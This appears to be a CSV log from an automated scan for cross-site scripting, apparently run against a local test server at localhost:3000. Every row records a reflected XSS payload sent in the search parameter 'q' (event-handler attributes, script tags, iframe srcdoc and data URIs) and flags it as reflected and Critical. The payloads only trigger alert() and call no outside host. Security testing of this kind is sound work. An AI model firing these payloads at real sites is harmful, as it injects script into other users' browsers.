+2026-01-10 16:23:33.541,2026-01-10 16:23:33.548,0.008,http://localhost:3000/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.548,2026-01-10 16:23:33.553,0.004,http://localhost:3000/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.553,2026-01-10 16:23:33.556,0.003,http://localhost:3000/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.556,2026-01-10 16:23:33.564,0.008,http://localhost:3000/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.564,2026-01-10 16:23:33.568,0.004,http://localhost:3000/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.568,2026-01-10 16:23:33.571,0.003,http://localhost:3000/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.571,2026-01-10 16:23:33.574,0.003,http://localhost:3000/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.574,2026-01-10 16:23:33.580,0.006,http://localhost:3000/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.580,2026-01-10 16:23:33.584,0.004,http://localhost:3000/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.584,2026-01-10 16:23:33.587,0.003,http://localhost:3000/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.587,2026-01-10 16:23:33.590,0.003,http://localhost:3000/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.590,2026-01-10 16:23:33.597,0.007,http://localhost:3000/search,GET,q,<input type=month onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.597,2026-01-10 16:23:33.601,0.004,http://localhost:3000/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.601,2026-01-10 16:23:33.605,0.003,http://localhost:3000/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.605,2026-01-10 16:23:33.612,0.008,http://localhost:3000/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.612,2026-01-10 16:23:33.616,0.004,http://localhost:3000/search,GET,q,<input type=button onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.617,2026-01-10 16:23:33.620,0.003,http://localhost:3000/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.620,2026-01-10 16:23:33.623,0.003,http://localhost:3000/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.623,2026-01-10 16:23:33.630,0.007,http://localhost:3000/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.630,2026-01-10 16:23:33.633,0.003,http://localhost:3000/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.633,2026-01-10 16:23:33.637,0.004,http://localhost:3000/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.637,2026-01-10 16:23:33.640,0.002,http://localhost:3000/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.640,2026-01-10 16:23:33.647,0.007,http://localhost:3000/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.647,2026-01-10 16:23:33.651,0.004,http://localhost:3000/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.651,2026-01-10 16:23:33.654,0.003,http://localhost:3000/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.654,2026-01-10 16:23:33.663,0.009,http://localhost:3000/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.663,2026-01-10 16:23:33.668,0.004,http://localhost:3000/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.668,2026-01-10 16:23:33.671,0.003,http://localhost:3000/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.671,2026-01-10 16:23:33.673,0.002,http://localhost:3000/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.673,2026-01-10 16:23:33.680,0.007,http://localhost:3000/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.681,2026-01-10 16:23:33.684,0.004,http://localhost:3000/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.684,2026-01-10 16:23:33.687,0.003,http://localhost:3000/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.687,2026-01-10 16:23:33.690,0.003,http://localhost:3000/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.690,2026-01-10 16:23:33.698,0.008,http://localhost:3000/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.698,2026-01-10 16:23:33.702,0.004,http://localhost:3000/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.702,2026-01-10 16:23:33.705,0.003,http://localhost:3000/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.705,2026-01-10 16:23:33.708,0.003,http://localhost:3000/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.708,2026-01-10 16:23:33.715,0.007,http://localhost:3000/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.715,2026-01-10 16:23:33.719,0.004,http://localhost:3000/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.719,2026-01-10 16:23:33.722,0.003,http://localhost:3000/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.722,2026-01-10 16:23:33.730,0.008,http://localhost:3000/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.730,2026-01-10 16:23:33.734,0.004,http://localhost:3000/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.734,2026-01-10 16:23:33.738,0.003,http://localhost:3000/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.738,2026-01-10 16:23:33.741,0.003,http://localhost:3000/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.741,2026-01-10 16:23:33.748,0.007,http://localhost:3000/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.748,2026-01-10 16:23:33.752,0.004,http://localhost:3000/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.752,2026-01-10 16:23:33.755,0.003,http://localhost:3000/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.755,2026-01-10 16:23:33.757,0.002,http://localhost:3000/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.757,2026-01-10 16:23:33.764,0.007,http://localhost:3000/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.764,2026-01-10 16:23:33.768,0.004,http://localhost:3000/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.768,2026-01-10 16:23:33.771,0.003,http://localhost:3000/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.771,2026-01-10 16:23:33.774,0.003,http://localhost:3000/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.774,2026-01-10 16:23:33.781,0.007,http://localhost:3000/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.781,2026-01-10 16:23:33.785,0.004,http://localhost:3000/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.785,2026-01-10 16:23:33.788,0.003,http://localhost:3000/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.788,2026-01-10 16:23:33.797,0.009,http://localhost:3000/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.797,2026-01-10 16:23:33.802,0.005,http://localhost:3000/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.802,2026-01-10 16:23:33.804,0.003,http://localhost:3000/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.804,2026-01-10 16:23:33.807,0.002,http://localhost:3000/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.807,2026-01-10 16:23:33.814,0.007,http://localhost:3000/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.814,2026-01-10 16:23:33.818,0.004,http://localhost:3000/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.819,2026-01-10 16:23:33.821,0.003,http://localhost:3000/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.821,2026-01-10 16:23:33.830,0.009,http://localhost:3000/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.830,2026-01-10 16:23:33.835,0.005,http://localhost:3000/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.835,2026-01-10 16:23:33.838,0.003,http://localhost:3000/search,GET,q,<font onmouseover=alert(1)>X</font>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.838,2026-01-10 16:23:33.840,0.002,http://localhost:3000/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.840,2026-01-10 16:23:33.848,0.007,http://localhost:3000/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.848,2026-01-10 16:23:33.852,0.004,http://localhost:3000/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.852,2026-01-10 16:23:33.855,0.003,http://localhost:3000/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.855,2026-01-10 16:23:33.858,0.003,http://localhost:3000/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.858,2026-01-10 16:23:33.866,0.008,http://localhost:3000/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.866,2026-01-10 16:23:33.869,0.003,http://localhost:3000/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.869,2026-01-10 16:23:33.872,0.003,http://localhost:3000/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.872,2026-01-10 16:23:33.875,0.002,http://localhost:3000/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.875,2026-01-10 16:23:33.883,0.009,http://localhost:3000/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.883,2026-01-10 16:23:33.887,0.003,http://localhost:3000/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.887,2026-01-10 16:23:33.890,0.003,http://localhost:3000/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.890,2026-01-10 16:23:33.897,0.007,http://localhost:3000/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.897,2026-01-10 16:23:33.901,0.005,http://localhost:3000/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.901,2026-01-10 16:23:33.904,0.003,http://localhost:3000/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.904,2026-01-10 16:23:33.908,0.003,http://localhost:3000/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.908,2026-01-10 16:23:33.916,0.009,http://localhost:3000/search,GET,q,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.916,2026-01-10 16:23:33.920,0.004,http://localhost:3000/search,GET,q,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
